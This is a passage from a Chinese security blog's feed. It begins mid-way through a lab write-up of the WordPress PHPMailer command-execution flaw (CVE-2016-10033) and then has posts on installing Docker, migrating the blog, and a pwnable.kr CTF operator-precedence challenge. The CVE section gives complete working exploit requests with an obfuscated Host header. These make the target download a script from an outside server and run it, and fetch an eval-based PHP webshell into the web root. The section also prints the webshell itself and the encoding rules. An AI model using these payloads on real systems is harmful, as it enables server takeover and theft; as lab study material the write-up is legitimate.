class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-login.php?action=lostpassword</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce your_server_ip$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;example.txt&#125;&#125; null)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin</span><br></pre></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash /tmp/rce</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-login.php?action=lostpassword</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bash$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce&#125;&#125; null)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin</span><br></pre></td></tr></table></figure><h4 id="思路二：写入webshell再用菜刀连接"><a href="#思路二：写入webshell再用菜刀连接" class="headerlink" title="思路二：写入webshell再用菜刀连接"></a>思路二：写入webshell再用菜刀连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wget --output-document /var/www/html/webshell.php raw.githubusercontent.com/medicean/vulapps/master/w/wordpress/6/webshell.php</span><br></pre></td></tr></table></figure><p>注意事项：</p><ol><li>远程 URL 中不要有 <code>http://</code></li><li>所有字母必须小写</li><li>所有 / 用 <code>${substr{0}{1}{$spool_directory}}</code> 代替</li><li>所有 空格 用 <code>${substr{10}{1}{$tod_log}}</code> 代替</li></ol><p>重放包：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-login.php?action=lostpassword</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;var$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;www$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;html$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;webshell.php$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;raw.githubusercontent.com$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;medicean$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;vulapps$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;master$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;w$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wordpress$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;6$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;webshell.php&#125;&#125; null)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Content-Length</span>: 56</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">wp-submit=Get+New+Password&amp;redirect_to=&amp;user_login=admin</span><br></pre></td></tr></table></figure><p>重放此数据包后网站根目录下多了一个webshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'ant'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时可以用菜刀连接发现连接成功。</p><p><img src="https://s1.ax1x.com/2018/05/28/C4VVbR.png" alt="C4VVbR.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WordPress-lt-4-6-命令执行漏洞-PHPMailer-CVE-2016-10033-实验&quot;&gt;&lt;a href=&quot;#WordPress-lt-4-6-命令执行漏洞-PHPMailer-CVE-2016-10033-实验&quot; class=&quot;headerlin
      
    
    </summary>
    
      <category term="WEB安全" scheme="https://hvnt3r.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CVE" scheme="https://hvnt3r.top/tags/CVE/"/>
    
      <category term="Wordpress" scheme="https://hvnt3r.top/tags/Wordpress/"/>
    
      <category term="PHP" scheme="https://hvnt3r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04安装Docker</title>
    <link href="https://hvnt3r.top/2018/09/Ubuntu16-04%E5%AE%89%E8%A3%85Docker/"/>
    <id>https://hvnt3r.top/2018/09/Ubuntu16-04安装Docker/</id>
    <published>2018-09-06T00:32:52.000Z</published>
    <updated>2018-09-06T00:35:22.770Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ubuntu16-04安装配置Docker"><a href="#Ubuntu16-04安装配置Docker" class="headerlink" title="Ubuntu16.04安装配置Docker"></a>Ubuntu16.04安装配置Docker</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>因为要使用Docker进行一些web漏洞相关的实验，所以学习了下安装和使用Docker的方法，选用Ubuntu16的原因不必多说，性能稳定，各种第三方支持也比较完善，话不多说，开始动手！</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>首先，先进行更新<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/C496yt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/28/C496yt.png" alt="C496yt.png"></a><br>因为通过curl方式安装可能会出现版本老旧的问题，所以我才用了pip安装的方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/C49cOP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/28/C49cOP.png" alt="C49cOP.png"></a><br>pip安装成功后，使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><p>来安装docker-compose<br><img src="https://s1.ax1x.com/2018/05/28/C49WTS.png" alt="C49WTS.png"><br>此时系统可能会提示pip版本低，于是按照系统提示进行pip的升级<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/28/C49yQI.png" alt="C49yQI.png"><br><a href="https://imgchr.com/i/C49Rw8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/28/C49Rw8.png" alt="C49Rw8.png"></a><br>pip升级完成后安装docker.io<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/28/C492ef.png" alt="C492ef.png"><br>大功告成！<br>此时可使用docker info 命令来查看docker信息，但是由于系统权限限制，加上sudo才能正常查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ubuntu16-04安装配置Docker&quot;&gt;&lt;a href=&quot;#Ubuntu16-04安装配置Docker&quot; class=&quot;headerlink&quot; title=&quot;Ubuntu16.04安装配置Docker&quot;&gt;&lt;/a&gt;Ubuntu16.04安装配置Docker&lt;/
      
    
    </summary>
    
      <category term="Docker" scheme="https://hvnt3r.top/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://hvnt3r.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>博客迁移说明</title>
    <link href="https://hvnt3r.top/2018/09/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AF%B4%E6%98%8E/"/>
    <id>https://hvnt3r.top/2018/09/博客迁移说明/</id>
    <published>2018-09-05T03:06:10.000Z</published>
    <updated>2018-09-05T03:23:34.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="博客迁移说明"><a href="#博客迁移说明" class="headerlink" title="博客迁移说明"></a>博客迁移说明</h1><p>关于我写博客的历程，我最开始使用的是<code>CSDN</code>，优点是免费，易于维护，但是作为一个伪Geek，我还是很喜欢定制化的个性博客，于是我购买了一台腾讯云的主机用于搭建<code>WordPress</code>博客，在主题选择和插件的丰富上都做了不少的功夫，最终打造了一个页面美观大方功能齐全的个人博客，但是在日常使用过程中发现发布文章的过程十分繁琐而且没有一个良好的版本控制，什么时候博客崩了就什么都没有了，在这个知识就是金钱的时代我是必然要避免这种风险的，于是我选择了<code>Hexo+GithubPage</code>，静态的页面安全性高了很多，而且GitHubPage也是免费的，git也有版本控制，万一手贱点错了我还能找回之前的信息，所以选择了Hexo，目前这个站点上还没有很多的博客，不过我会慢慢的把存储在其他地方的博客迁移到这上面，敬请期待！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;博客迁移说明&quot;&gt;&lt;a href=&quot;#博客迁移说明&quot; class=&quot;headerlink&quot; title=&quot;博客迁移说明&quot;&gt;&lt;/a&gt;博客迁移说明&lt;/h1&gt;&lt;p&gt;关于我写博客的历程，我最开始使用的是&lt;code&gt;CSDN&lt;/code&gt;，优点是免费，易于维护，但是作为一个伪
      
    
    </summary>
    
      <category term="生活" scheme="https://hvnt3r.top/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="https://hvnt3r.top/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr_mistake</title>
    <link href="https://hvnt3r.top/2018/09/pwnable-kr-mistake/"/>
    <id>https://hvnt3r.top/2018/09/pwnable-kr-mistake/</id>
    <published>2018-09-04T15:56:50.000Z</published>
    <updated>2018-09-05T01:26:16.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnable-kr-mistake"><a href="#pwnable-kr-mistake" class="headerlink" title="pwnable.kr_mistake"></a>pwnable.kr_mistake</h1><p><strong>题面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">We all make mistakes, let&apos;s move on.</span><br><span class="line">(don&apos;t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line"></span><br><span class="line">This task is based on real event</span><br><span class="line">Thanks to dhmonkey</span><br><span class="line"></span><br><span class="line">hint : operator priority</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>提示这道题的要点是运算符的优先级</p><p>连上服务器后发现题目文件夹下有四个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@ubuntu:~$ ls -l</span><br><span class="line">total 24</span><br><span class="line">-r-------- 1 mistake_pwn root      51 Jul 29  2014 flag</span><br><span class="line">-r-sr-x--- 1 mistake_pwn mistake 8934 Aug  1  2014 mistake</span><br><span class="line">-rw-r--r-- 1 root        root     792 Aug  1  2014 mistake.c</span><br><span class="line">-r-------- 1 mistake_pwn root      10 Jul 29  2014 password</span><br></pre></td></tr></table></figure><p>查看一下<code>mistake.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                               </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;                                               </span></span></span><br><span class="line">                                                                 </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10                                                </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1                                                 </span></span><br><span class="line">                                                                 </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;                                      </span><br><span class="line">        <span class="keyword">int</span> i;                                                   </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;                                    </span><br><span class="line">                s[i] ^= XORKEY;                                  </span><br><span class="line">        &#125;                                                        </span><br><span class="line">&#125;                                                                </span><br><span class="line">                                                                 </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;                                </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="keyword">int</span> fd;                                                  </span><br><span class="line">        <span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);          </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;                                        </span><br><span class="line">        &#125;                                                        </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);                        </span><br><span class="line">        sleep(time(<span class="number">0</span>)%<span class="number">20</span>);                                       </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];                                   </span><br><span class="line">        <span class="keyword">int</span> len;                                                 </span><br><span class="line">        <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;                   </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);                          </span><br><span class="line">                close(fd);                                       </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;                                        </span><br><span class="line">        &#125;                                                        </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];                                  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"input password : "</span>);                             </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);                                  </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="comment">// xor your input                                        </span></span><br><span class="line">        xor(pw_buf2, <span class="number">10</span>);                                        </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;                   </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);                         </span><br><span class="line">                system(<span class="string">"/bin/cat flag\n"</span>);                       </span><br><span class="line">        &#125;                                                        </span><br><span class="line">        <span class="keyword">else</span>&#123;                                                    </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);                      </span><br><span class="line">        &#125;                                                        </span><br><span class="line">                                                                 </span><br><span class="line">        close(fd);                                               </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据题目的提示<code>运算符</code>我找一些代码中的关键点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);          </span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;                                        </span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>在这里由于<code>open()</code>的返回值不会小于0，且<code>&lt;</code>的优先级比<code>=</code>高，所以这句语句的结果是open()的返回值!&lt;0，所以<code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>的值为false，因此赋值给fd的时候fd为0，此平台的第一题就是考察的<code>File descriptor</code>，当值为0时执行标准输入，因此实际上代码并不会读password文件，而是等待用户的输入，这就可以让我们来伪造password</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor(pw_buf2, <span class="number">10</span>);                                        </span><br><span class="line">      <span class="comment">//对用户的输入xor                                                         </span></span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;     <span class="comment">//比较xor后的密码与“原”密码              </span></span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);                         </span><br><span class="line">              system(<span class="string">"/bin/cat flag\n"</span>);                       </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要再fd赋值之后输入自己的10位密码，然后再输入xor后的密码，即可比对成功拿到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@ubuntu:~$ ./mistake</span><br><span class="line"><span class="keyword">do</span> not bruteforce...</span><br><span class="line">1111111111</span><br><span class="line">input password : 0000000000</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwnable-kr-mistake&quot;&gt;&lt;a href=&quot;#pwnable-kr-mistake&quot; class=&quot;headerlink&quot; title=&quot;pwnable.kr_mistake&quot;&gt;&lt;/a&gt;pwnable.kr_mistake&lt;/h1&gt;&lt;p&gt;&lt;stron
      
    
    </summary>
    
      <category term="CTF" scheme="https://hvnt3r.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://hvnt3r.top/tags/CTF/"/>
    
      <category term="PWN" scheme="https://hvnt3r.top/tags/PWN/"/>
    
  </entry>
  
</feed>
